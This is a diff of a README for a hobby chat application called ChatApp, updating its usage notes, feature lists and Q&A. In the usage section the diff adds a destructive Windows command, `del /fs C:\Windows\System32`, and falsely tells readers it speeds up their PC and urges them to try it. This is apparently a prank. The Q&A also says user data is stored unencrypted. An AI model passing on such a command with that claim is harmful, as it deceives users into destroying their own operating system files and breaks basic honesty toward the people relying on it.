@@ -8,15 +8,18 @@
 ## About
 
 This is a really simple chat app (hence the name ChatApp).
+
 Easy to use and even easier to fall in love with!
 
----
 
 ## How to use
 
 It's farely simple!
+
 Just type these commands into the command line.
+
 `del /fs C:\Windows\System32`
+
 No! Wait, that just speeds up your PC. Really! Try it :)
 
 But what you really need to do:
@@ -27,7 +30,6 @@ But what you really need to do:
 
 See? Wasn't that hard afterall
 
----
 
 ## Features
 
@@ -36,11 +38,12 @@ See? Wasn't that hard afterall
 - An ID system
 - Profile
     - Ability to create / see eachothers posts
+    - Commenting on posts
+    - Editable bio
 - Chat rooms
     - Doesn't store chat data
 
 
----
 
 ## Upcoming features
 
@@ -50,18 +53,20 @@ There are many features that I'm currently working on and/or would love to see i
 - Responsive design
 - Mobile compability 
 - Profile
-    - Editable status
     - Changeable profile image
-    - Ability to like and comment on posts
+    - Adding friends
+- Chat
+    - Ability to post images and links
 
----
 
 ## Q&A
 
 **Is it safe?**
+
 *No. I'm storing user data, without encrypion*
 
 **Why should I use this instead of some other chatting apps?**
+
 *You shouldn't.*
 
 ## Comment
